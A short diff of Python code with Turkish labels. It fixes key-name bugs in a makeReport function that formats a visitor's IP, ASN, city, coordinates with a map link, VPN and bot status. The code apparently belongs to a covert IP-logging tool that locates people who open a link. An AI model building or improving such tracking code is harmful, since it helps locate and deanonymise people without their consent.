@@ -156,10 +156,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
 > **Ulke:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Irk:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **Şehir:** `{info['city'] if info['Şehir'] else 'Unknown'}`
+> **Şehir:** `{info['city'] if info['city'] else 'Unknown'}`
 > **Adres:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Kesin olmayabilir.' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobil:** `{info['Mobil']}`
+> **Mobil:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
